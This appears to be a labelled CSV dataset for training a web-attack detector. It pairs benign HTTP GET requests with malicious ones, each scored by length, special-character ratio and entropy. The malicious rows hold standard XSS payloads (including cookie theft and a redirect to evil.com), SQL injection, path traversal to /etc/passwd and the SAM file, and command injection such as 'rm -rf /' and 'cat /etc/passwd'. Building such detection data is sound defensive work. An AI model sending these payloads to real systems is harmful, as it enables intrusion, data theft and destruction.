payload,label,length,special_ratio,entropy
GET /products.html?limit=10 HTTP/1.1,0,36.0,0.0,4.440351042928688
GET /login?price=100 HTTP/1.1,0,29.0,0.0,4.254195650150781
GET /search?sort=name HTTP/1.1,0,30.0,0.0,4.281727678869737
GET /dashboard?size=medium&filter=active HTTP/1.1,0,49.0,0.02040816326530612,4.6705330582684645
GET /comment?q=<input onfocus=alert(1) autofocus> HTTP/1.1,1,58.0,0.06896551724137931,4.674719090246699
GET /dashboard?filter=active&id=123 HTTP/1.1,0,44.0,0.022727272727272728,4.646376220664175
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /post?q=<iframe src=javascript:alert('XSS')> HTTP/1.1,1,57.0,0.10526315789473684,4.902722470153268
GET /file?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,52.0,0.1346153846153846,3.9453055682456224
GET /api/users?size=medium HTTP/1.1,0,35.0,0.0,4.221441945207327
GET /contact.html?page=1&sort=name&category=electronics HTTP/1.1,0,64.0,0.03125,4.523382914624721
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /about.html?size=medium&filter=active HTTP/1.1,0,50.0,0.02,4.653660689688186
GET /document?file=....//....//....//etc/passwd HTTP/1.1,1,56.0,0.0,4.0547689157515
GET /contact.html?filter=active&limit=10 HTTP/1.1,0,49.0,0.02040816326530612,4.461050149972743
GET /search?color=blue HTTP/1.1,0,31.0,0.0,4.284683810317086
GET /exec?cmd=hostname& cat /etc/passwd HTTP/1.1,1,48.0,0.020833333333333332,4.3970552088742005
GET /search?user=' OR '1'='1' -- HTTP/1.1,1,41.0,0.12195121951219512,4.187450335080594
GET /register?price=100&filter=active&sort=name HTTP/1.1,0,56.0,0.03571428571428571,4.532639243749495
GET /login?user=') OR ('1'='1 HTTP/1.1,1,38.0,0.15789473684210525,4.385956789702442
GET /search?q=<iframe src=javascript:alert('XSS')> HTTP/1.1,1,59.0,0.1016949152542373,4.848851211061991
GET /api/users?sort=name&id=123 HTTP/1.1,0,40.0,0.025,4.546439344671016
GET /api/user?user=admin'/* HTTP/1.1,1,36.0,0.027777777777777776,4.3711781263822145
GET /contact.html?limit=10&sort=name&page=1 HTTP/1.1,0,52.0,0.038461538461538464,4.572955285773964
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /document?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1,1,63.0,0.0,4.530275805107375
GET /comment?q=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1,1,61.0,0.06557377049180328,4.819680984926534
"GET /search?user=' UNION ALL SELECT NULL,NULL-- HTTP/1.1",1,56.0,0.017857142857142856,4.509657878074444
GET /index.html?id=123 HTTP/1.1,0,31.0,0.0,4.324848729602135
GET /search?q=%3Cbody onload=alert('XSS')%3E HTTP/1.1,1,53.0,0.07547169811320754,4.9162308317584085
GET /login?user=1%27%20AND%20%271%27=%272 HTTP/1.1,1,50.0,0.0,4.365533250556853
GET /blog?limit=10&sort=name&price=100 HTTP/1.1,0,47.0,0.0425531914893617,4.5967260855360665
GET /search?q=<textarea onfocus=alert(1) autofocus> HTTP/1.1,1,60.0,0.06666666666666667,4.604574504151557
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /login?user=%27%20UNION%20SELECT%20*%20FROM%20users-- HTTP/1.1,1,66.0,0.0,4.8604703998521295
GET /settings?page=1 HTTP/1.1,0,29.0,0.0,4.1162646156680225
GET /api/products?category=electronics&color=blue&limit=10 HTTP/1.1,0,67.0,0.029850746268656716,4.65953947467378
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /comment?q=<script>alert('XSS')</script> HTTP/1.1,1,53.0,0.1509433962264151,4.803023284588598
GET /index.html?size=medium HTTP/1.1,0,36.0,0.0,4.363826390090815
GET /profile?q=<svg onload=alert('XSS')> HTTP/1.1,1,49.0,0.12244897959183673,4.900025150061047
GET /api/user?user=%27;%20DROP%20TABLE%20users-- HTTP/1.1,1,57.0,0.017543859649122806,4.678952513974961
GET /api/users?sort=name HTTP/1.1,0,33.0,0.0,4.309101316131472
GET /login?user=%27%20OR%20%271%27=%271%27%20-- HTTP/1.1,1,56.0,0.0,4.287365359936823
GET /search?q=javascript:alert('XSS') HTTP/1.1,1,46.0,0.08695652173913043,4.751610325528165
GET /image?file=../../../etc/passwd HTTP/1.1,1,44.0,0.0,4.216908108113273
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /login?q=search+term&color=blue&page=1 HTTP/1.1,0,51.0,0.0392156862745098,4.720869949560109
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /docs?id=123 HTTP/1.1,0,25.0,0.0,4.023465189601646
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /api/users?sort=name HTTP/1.1,0,33.0,0.0,4.309101316131472
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /register?sort=name HTTP/1.1,0,32.0,0.0,4.241729296672174
GET /search?q=<select onfocus=alert(1) autofocus> HTTP/1.1,1,58.0,0.06896551724137931,4.586007934596238
GET /search?q=<keygen onfocus=alert(1) autofocus> HTTP/1.1,1,58.0,0.06896551724137931,4.745406425938248
GET /search?user=' OR 1=1 -- HTTP/1.1,1,37.0,0.02702702702702703,4.226628285180294
GET /contact.html?filter=active&color=blue HTTP/1.1,0,51.0,0.0196078431372549,4.537635087443512
GET /comment?q=<svg onload=alert('XSS')> HTTP/1.1,1,49.0,0.12244897959183673,4.874614690921527
GET /post?q=javascript:alert('XSS') HTTP/1.1,1,44.0,0.09090909090909091,4.771598379853423
GET /file?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,51.0,0.0,4.355537901604238
GET /register?category=electronics&price=100&limit=10 HTTP/1.1,0,62.0,0.03225806451612903,4.486555690069278
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /settings?color=blue&size=medium HTTP/1.1,0,45.0,0.022222222222222223,4.5970828184076655
GET /comment?q=<keygen onfocus=alert(1) autofocus> HTTP/1.1,1,59.0,0.06779661016949153,4.727745329236117
GET /search?q=%3Cinput onfocus=alert(1) autofocus%3E HTTP/1.1,1,61.0,0.03278688524590164,4.774518894727134
GET /docs?color=blue&id=123&limit=10 HTTP/1.1,0,45.0,0.044444444444444446,4.563532262755955
GET /docs?sort=name&page=1&limit=10 HTTP/1.1,0,44.0,0.045454545454545456,4.6069367321753205
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /file?file=..;/..;/..;/etc/passwd HTTP/1.1,1,46.0,0.06521739130434782,4.188215826378304
GET /products.html?category=electronics&sort=name&id=123 HTTP/1.1,0,65.0,0.03076923076923077,4.751149497903983
GET /dashboard?limit=10&page=1&category=electronics HTTP/1.1,0,60.0,0.03333333333333333,4.71882038702278
GET /search?category=electronics&q=search+term HTTP/1.1,0,55.0,0.01818181818181818,4.513203241490941
GET /document?file=..\..\..\windows\system32\config\sam HTTP/1.1,1,64.0,0.09375,4.629834617629516
"GET /login?user=%27%20UNION%20ALL%20SELECT%20NULL,NULL-- HTTP/1.1",1,65.0,0.0,4.724205652911475
GET /image?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,52.0,0.0,4.4473385747039735
GET /post?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,53.0,0.11320754716981132,4.824631719074005
GET /products.html?category=electronics&page=1 HTTP/1.1,0,55.0,0.01818181818181818,4.671913349730952
GET /file?file=..%c0%af..%c0%af..%c0%afetc/passwd HTTP/1.1,1,58.0,0.0,4.27538703061342
GET /docs?color=blue&q=search+term HTTP/1.1,0,43.0,0.023255813953488372,4.594301091659833
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /search?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,54.0,0.05555555555555555,4.755365864181302
GET /file?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,52.0,0.1346153846153846,3.9453055682456224
GET /products.html?id=123&q=search+term HTTP/1.1,0,48.0,0.020833333333333332,4.772055208874202
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /products.html?size=medium&limit=10 HTTP/1.1,0,48.0,0.020833333333333332,4.579448698502607
GET /post?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,53.0,0.11320754716981132,4.824631719074005
GET /search?sort=name HTTP/1.1,0,30.0,0.0,4.281727678869737
GET /profile?user=%27;%20DROP%20TABLE%20users-- HTTP/1.1,1,56.0,0.017857142857142856,4.789148671903073
GET /profile?q=<select onfocus=alert(1) autofocus> HTTP/1.1,1,59.0,0.06779661016949153,4.634359312213627
GET /login?filter=active HTTP/1.1,0,33.0,0.0,4.392582755590971
GET /login?sort=name&page=1 HTTP/1.1,0,36.0,0.027777777777777776,4.461320140211008
GET /register?limit=10&page=1 HTTP/1.1,0,38.0,0.02631578947368421,4.346225868535944
GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1,1,62.0,0.0967741935483871,4.770582149334389
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /login?price=100 HTTP/1.1,0,29.0,0.0,4.254195650150781
GET /products.html?filter=active&page=1 HTTP/1.1,0,48.0,0.020833333333333332,4.704448698502607
GET /profile?user=' OR '1'='1' -- HTTP/1.1,1,42.0,0.11904761904761904,4.297694364420734
GET /search?limit=10 HTTP/1.1,0,29.0,0.0,4.32316116739216
GET /profile?q=<iframe src=javascript:alert('XSS')> HTTP/1.1,1,60.0,0.1,4.896404087557007
GET /api/users?category=electronics&id=123 HTTP/1.1,0,51.0,0.0196078431372549,4.666852547556903
GET /document?file=....//....//....//etc/passwd HTTP/1.1,1,56.0,0.0,4.0547689157515
GET /contact.html?color=blue HTTP/1.1,0,37.0,0.0,4.350684784255508
GET /post?q=<input onfocus=alert(1) autofocus> HTTP/1.1,1,55.0,0.07272727272727272,4.620008750235072
GET /api/products?limit=10&id=123&price=100 HTTP/1.1,0,52.0,0.038461538461538464,4.565945132377805
GET /file?file=..//..//..//etc/passwd HTTP/1.1,1,46.0,0.0,4.008549250150252
GET /profile?user=') OR ('1'='1 HTTP/1.1,1,40.0,0.15,4.403055907333275
GET /docs?size=medium HTTP/1.1,0,30.0,0.0,4.21506101220307
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /search?q=<script>document.location='http://evil.com'</script> HTTP/1.1,1,75.0,0.08,4.773371817214928
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /docs?color=blue&size=medium&sort=name HTTP/1.1,0,51.0,0.0392156862745098,4.593610635919459
GET /search?q=search+term&color=blue&page=1 HTTP/1.1,0,52.0,0.038461538461538464,4.596899756886205
GET /api/user?user=admin' -- HTTP/1.1,1,37.0,0.02702702702702703,4.391489514102183
GET /profile?user=' UNION SELECT * FROM users-- HTTP/1.1,1,56.0,0.017857142857142856,4.759657878074444
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /blog?q=search+term&size=medium&category=electronics HTTP/1.1,0,65.0,0.03076923076923077,4.746434013496955
GET /profile?q=<script>document.location='http://evil.com'</script> HTTP/1.1,1,76.0,0.07894736842105263,4.777891008010804
GET /register?page=1 HTTP/1.1,0,29.0,0.0,4.090234012145144
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /search?q=<select onfocus=alert(1) autofocus> HTTP/1.1,1,58.0,0.06896551724137931,4.586007934596238
GET /api/users?price=100 HTTP/1.1,0,33.0,0.0,4.187889194919351
"GET /api/user?user=' UNION ALL SELECT NULL,NULL-- HTTP/1.1",1,58.0,0.017241379310344827,4.523051306072045
GET /profile?q=<video><source onerror='alert(1)'> HTTP/1.1,1,58.0,0.13793103448275862,4.702916883753591
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /api/user?user=admin'/* HTTP/1.1,1,36.0,0.027777777777777776,4.3711781263822145
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /profile?size=medium&q=search+term&category=electronics HTTP/1.1,0,68.0,0.029411764705882353,4.73247805467067
GET /exec?cmd=hostname$(cat /etc/passwd) HTTP/1.1,1,49.0,0.061224489795918366,4.5172723438944455
GET /register?page=1 HTTP/1.1,0,29.0,0.0,4.090234012145144
GET /comment?q=<script>alert(document.cookie)</script> HTTP/1.1,1,63.0,0.09523809523809523,4.723411376520694
GET /comment?q=%3Caudio src=x onerror=alert(1)%3E HTTP/1.1,1,58.0,0.034482758620689655,4.743684607488078
GET /download?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,56.0,0.125,4.106158925726099
GET /login?sort=name HTTP/1.1,0,29.0,0.0,4.349191770915039
GET /login?price=100 HTTP/1.1,0,29.0,0.0,4.254195650150781
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /search?user=') OR ('1'='1 HTTP/1.1,1,39.0,0.15384615384615385,4.291687154704211
GET /post?q=%3Caudio src=x onerror=alert(1)%3E HTTP/1.1,1,55.0,0.03636363636363636,4.729099659325981
GET /profile?id=123&color=blue&category=electronics HTTP/1.1,0,60.0,0.03333333333333333,4.669576746316393
GET /dashboard?limit=10&q=search+term&color=blue HTTP/1.1,0,57.0,0.03508771929824561,4.722640671793787
GET /profile?size=medium&limit=10&page=1 HTTP/1.1,0,49.0,0.04081632653061224,4.556050599606489
GET /products.html?id=123&limit=10&q=search+term HTTP/1.1,0,57.0,0.03508771929824561,4.784215671869699
GET /index.html?color=blue&page=1&q=search+term HTTP/1.1,0,56.0,0.03571428571428571,4.8183535294637805
GET /search?user=%27%20OR%20%27a%27=%27a HTTP/1.1,1,49.0,0.0,4.297784843850294
GET /profile?q=search+term&sort=name HTTP/1.1,0,45.0,0.022222222222222223,4.630633374059376
GET /login?user=admin' -- HTTP/1.1,1,34.0,0.029411764705882353,4.51364592935837
GET /profile?q=<script>alert(document.cookie)</script> HTTP/1.1,1,63.0,0.09523809523809523,4.766729724984195
GET /login?user=admin%27/* HTTP/1.1,1,35.0,0.0,4.629003731107051
GET /exec?cmd=hostname| whoami HTTP/1.1,1,39.0,0.02564102564102564,4.490029141717277
GET /blog?color=blue&category=electronics&id=123 HTTP/1.1,0,57.0,0.03508771929824561,4.628869128496482
GET /dashboard?color=blue&page=1&limit=10 HTTP/1.1,0,50.0,0.04,4.6883674395583785
GET /profile?q=<iframe src=javascript:alert('XSS')> HTTP/1.1,1,60.0,0.1,4.896404087557007
GET /api/products?q=search+term&filter=active&color=blue HTTP/1.1,0,65.0,0.03076923076923077,4.722314067428179
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /profile?q=<textarea onfocus=alert(1) autofocus> HTTP/1.1,1,61.0,0.06557377049180328,4.662145895181669
GET /contact.html?category=electronics&color=blue HTTP/1.1,0,58.0,0.017241379310344827,4.509035633790892
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /blog?page=1&size=medium&category=electronics HTTP/1.1,0,58.0,0.034482758620689655,4.706360520653929
GET /profile?sort=name&category=electronics&id=123 HTTP/1.1,0,59.0,0.03389830508474576,4.693847024151371
GET /download?file=../../../etc/passwd HTTP/1.1,1,47.0,0.0,4.263715777995571
GET /profile?q=search+term HTTP/1.1,0,35.0,0.0,4.550292659616668
GET /about.html?page=1 HTTP/1.1,0,31.0,0.0,4.324848729602135
GET /api/user?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,56.0,0.05357142857142857,4.758621780036169
GET /dashboard?id=123&price=100&color=blue HTTP/1.1,0,51.0,0.0392156862745098,4.657240292739784
GET /login?size=medium&limit=10 HTTP/1.1,0,40.0,0.025,4.425070520364182
GET /image?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,53.0,0.1320754716981132,4.043637892401607
GET /login?user=1%27%20ORDER%20BY%201-- HTTP/1.1,1,48.0,0.0,4.67850885479768
GET /api/users?sort=name HTTP/1.1,0,33.0,0.0,4.309101316131472
GET /products.html?q=search+term&id=123&price=100 HTTP/1.1,0,58.0,0.034482758620689655,4.792904486320376
GET /api/products?page=1&category=electronics&color=blue HTTP/1.1,0,65.0,0.03076923076923077,4.593629021634329
GET /api/products?size=medium&limit=10&filter=active HTTP/1.1,0,61.0,0.03278688524590164,4.628673043051071
GET /profile?user=1' ORDER BY 1-- HTTP/1.1,1,42.0,0.023809523809523808,4.526495328097802
GET /profile?q=search+term&page=1&id=123 HTTP/1.1,0,49.0,0.04081632653061224,4.75216571132969
GET /dashboard?category=electronics&id=123&size=medium HTTP/1.1,0,63.0,0.031746031746031744,4.776506264900797
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /post?q=<body onload=alert('XSS')> HTTP/1.1,1,47.0,0.1276595744680851,4.799061723926001
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /settings?id=123&page=1 HTTP/1.1,0,36.0,0.027777777777777776,4.371178126382215
GET /profile?q=<textarea onfocus=alert(1) autofocus> HTTP/1.1,1,61.0,0.06557377049180328,4.662145895181669
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
"GET /profile?user=' AND 1=CONVERT(int, (SELECT @@version))-- HTTP/1.1",1,69.0,0.07246376811594203,5.005061188844579
GET /api/products?category=electronics&limit=10 HTTP/1.1,0,56.0,0.017857142857142856,4.6550455468258045
GET /docs?page=1 HTTP/1.1,0,25.0,0.0,4.103465189601645
GET /api/users?price=100 HTTP/1.1,0,33.0,0.0,4.187889194919351
GET /docs?limit=10&size=medium HTTP/1.1,0,39.0,0.02564102564102564,4.406821128952238
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /register?category=electronics&sort=name&price=100 HTTP/1.1,0,63.0,0.031746031746031744,4.490127789028313
GET /search?q=javascript:alert('XSS') HTTP/1.1,1,46.0,0.08695652173913043,4.751610325528165
GET /settings?q=search+term HTTP/1.1,0,36.0,0.0,4.4193819456463705
GET /post?q=<script>alert('XSS')</script> HTTP/1.1,1,50.0,0.16,4.688367439558378
GET /command?cmd=hostname| whoami HTTP/1.1,1,42.0,0.023809523809523808,4.377336696990887
GET /contact.html?sort=name&size=medium HTTP/1.1,0,48.0,0.020833333333333332,4.595175521464346
GET /login?user=%27%20OR%20%271%27=%271 HTTP/1.1,1,48.0,0.0,4.339661719245796
GET /api/products?id=123 HTTP/1.1,0,33.0,0.0,4.369707376737534
GET /index.html?price=100&q=search+term&page=1 HTTP/1.1,0,55.0,0.03636363636363636,4.729099659325982
GET /search?id=123 HTTP/1.1,0,27.0,0.0,4.254525464966176
GET /document?file=..%c0%af..%c0%af..%c0%afetc/passwd HTTP/1.1,1,62.0,0.0,4.47370518229299
GET /exec?cmd=hostname; rm -rf / HTTP/1.1,1,41.0,0.024390243902439025,4.4641571147866035
GET /search?filter=active HTTP/1.1,0,34.0,0.0,4.337175341123076
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /command?cmd=hostname; sleep 10 HTTP/1.1,1,44.0,0.022727272727272728,4.453416561671605
GET /api/users?price=100&sort=name HTTP/1.1,0,43.0,0.023255813953488372,4.4837223125397525
GET /blog?category=electronics HTTP/1.1,0,39.0,0.0,4.438747090435226
GET /comment?q=<script>alert('XSS')</script> HTTP/1.1,1,53.0,0.1509433962264151,4.803023284588598
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /document?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1,1,63.0,0.0,4.530275805107375
GET /blog?sort=name&size=medium&page=1 HTTP/1.1,0,47.0,0.0425531914893617,4.639279277025428
GET /download?file=../../../../../../etc/passwd HTTP/1.1,1,56.0,0.0,3.983340344322928
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /api/products?category=electronics&limit=10 HTTP/1.1,0,56.0,0.017857142857142856,4.6550455468258045
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /exec?cmd=hostname`id` HTTP/1.1,1,35.0,0.05714285714285714,4.4575751596784805
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /login?sort=name HTTP/1.1,0,29.0,0.0,4.349191770915039
GET /register?q=search+term&page=1 HTTP/1.1,0,43.0,0.023255813953488372,4.423487650544801
GET /products.html?sort=name&category=electronics HTTP/1.1,0,58.0,0.017241379310344827,4.631784176528196
GET /search?page=1&price=100 HTTP/1.1,0,37.0,0.02702702702702703,4.303783770917413
"GET /profile?user=' AND 1=CONVERT(int, (SELECT @@version))-- HTTP/1.1",1,69.0,0.07246376811594203,5.005061188844579
GET /products.html?page=1&id=123&q=search+term HTTP/1.1,0,55.0,0.03636363636363636,4.803642667873434
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /api/user?user=') OR ('1'='1 HTTP/1.1,1,41.0,0.14634146341463414,4.2963379801223045
GET /file?file=..\..\..\windows\system32\config\sam HTTP/1.1,1,60.0,0.1,4.549791896188175
GET /document?file=../../../etc/passwd HTTP/1.1,1,47.0,0.0,4.348822160974294
GET /profile?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,56.0,0.10714285714285714,4.833616975397235
GET /login?price=100&limit=10&q=search+term HTTP/1.1,0,52.0,0.038461538461538464,4.666315919856145
GET /login?user=1' ORDER BY 10-- HTTP/1.1,1,41.0,0.024390243902439025,4.5681732734814915
GET /index.html?size=medium HTTP/1.1,0,36.0,0.0,4.363826390090815
GET /profile?q=%3Cimg src='x' onerror='alert(1)'%3E HTTP/1.1,1,60.0,0.1,4.7854870536894465
GET /login?user=' OR '1'='1'/* HTTP/1.1,1,39.0,0.1282051282051282,4.282340283509331
GET /register?limit=10&page=1 HTTP/1.1,0,38.0,0.02631578947368421,4.346225868535944
GET /about.html?price=100&id=123 HTTP/1.1,0,41.0,0.024390243902439025,4.704993772857998
GET /api/products?id=123&category=electronics&limit=10 HTTP/1.1,0,63.0,0.031746031746031744,4.736978884017097
GET /search?color=blue&price=100 HTTP/1.1,0,41.0,0.024390243902439025,4.485004748256684
GET /settings?page=1 HTTP/1.1,0,29.0,0.0,4.1162646156680225
GET /register?page=1 HTTP/1.1,0,29.0,0.0,4.090234012145144
GET /products.html?limit=10&sort=name&color=blue HTTP/1.1,0,57.0,0.03508771929824561,4.678952513974961
GET /search?user=%27%20OR%20%271%27=%271%27/* HTTP/1.1,1,54.0,0.0,4.2655840875788344
GET /docs?sort=name HTTP/1.1,0,28.0,0.0,4.280394654123195
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /post?q=<body onload=alert('XSS')> HTTP/1.1,1,47.0,0.1276595744680851,4.799061723926001
GET /login?page=1&price=100&limit=10 HTTP/1.1,0,45.0,0.044444444444444446,4.427979696753513
GET /profile?user=' OR 'a'='a HTTP/1.1,1,38.0,0.10526315789473684,4.385956789702441
"GET /api/user?user=%27%20UNION%20ALL%20SELECT%20NULL,NULL-- HTTP/1.1",1,68.0,0.0,4.688412430812586
GET /profile?category=electronics&id=123&q=search+term HTTP/1.1,0,63.0,0.031746031746031744,4.776506264900798
GET /search?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,54.0,0.05555555555555555,4.755365864181302
GET /post?q=%3Cbody onload=alert('XSS')%3E HTTP/1.1,1,51.0,0.0784313725490196,4.85850818502391
GET /contact.html?q=search+term HTTP/1.1,0,40.0,0.0,4.434183719779189
GET /products.html?color=blue&price=100 HTTP/1.1,0,48.0,0.020833333333333332,4.615601562950722
GET /search?filter=active&category=electronics&size=medium HTTP/1.1,0,67.0,0.029850746268656716,4.629688728405122
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /profile?q=javascript:alert('XSS') HTTP/1.1,1,47.0,0.0851063829787234,4.825553479199118
GET /document?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1,1,63.0,0.0,4.530275805107375
GET /login?user=' OR '1'='1 HTTP/1.1,1,36.0,0.1111111111111111,4.260067015271104
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /login?page=1&q=search+term HTTP/1.1,0,40.0,0.025,4.665311532225102
GET /settings?sort=name HTTP/1.1,0,32.0,0.0,4.241729296672174
GET /products.html?size=medium&limit=10&page=1 HTTP/1.1,0,55.0,0.03636363636363636,4.671913349730952
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /index.html?category=electronics&price=100&sort=name HTTP/1.1,0,65.0,0.03076923076923077,4.69868935122372
GET /contact.html?category=electronics&size=medium&color=blue HTTP/1.1,0,70.0,0.02857142857142857,4.6433791816828975
GET /contact.html?filter=active&limit=10 HTTP/1.1,0,49.0,0.02040816326530612,4.461050149972743
GET /login?id=123&color=blue&page=1 HTTP/1.1,0,44.0,0.045454545454545456,4.572623663895163
GET /settings?limit=10 HTTP/1.1,0,31.0,0.0,4.147114052043201
GET /login?page=1 HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /image?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1,1,60.0,0.0,4.420869604629682
GET /login?user=' OR '1'='1 HTTP/1.1,1,36.0,0.1111111111111111,4.260067015271104
GET /search?q=<img src='x' onerror='alert(1)'> HTTP/1.1,1,55.0,0.14545454545454545,4.68082653147046
GET /login?category=electronics&price=100 HTTP/1.1,0,50.0,0.02,4.5283674395583775
GET /profile?user='; DROP TABLE users-- HTTP/1.1,1,48.0,0.041666666666666664,4.629247855285172
GET /file?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,51.0,0.0,4.355537901604238
GET /login?page=1&category=electronics HTTP/1.1,0,47.0,0.02127659574468085,4.495558266341099
GET /index.html?price=100&size=medium HTTP/1.1,0,46.0,0.021739130434782608,4.604764945046351
GET /contact.html?price=100&page=1 HTTP/1.1,0,43.0,0.023255813953488372,4.536388882458135
GET /docs?price=100&category=electronics&size=medium HTTP/1.1,0,61.0,0.03278688524590164,4.657807165567071
GET /profile?user=1' ORDER BY 10-- HTTP/1.1,1,43.0,0.023255813953488372,4.580578057571859
GET /blog?page=1&limit=10&id=123 HTTP/1.1,0,41.0,0.04878048780487805,4.482569005083273
GET /api/users?filter=active HTTP/1.1,0,37.0,0.0,4.371087149178845
GET /profile?q=search+term&sort=name HTTP/1.1,0,45.0,0.022222222222222223,4.630633374059376
GET /contact.html?limit=10 HTTP/1.1,0,35.0,0.0,4.229003731107053
GET /post?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1,1,68.0,0.029411764705882353,4.769099010489391
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /login?id=123&color=blue HTTP/1.1,0,37.0,0.02702702702702703,4.479195257286955
GET /dashboard?color=blue&size=medium&limit=10 HTTP/1.1,0,55.0,0.03636363636363636,4.653376076846336
GET /comment?q=%3Cvideo%3E%3Csource onerror='alert(1)'%3E HTTP/1.1,1,66.0,0.06060606060606061,4.743659703722633
GET /about.html?q=search+term&limit=10 HTTP/1.1,0,47.0,0.02127659574468085,4.655340713241672
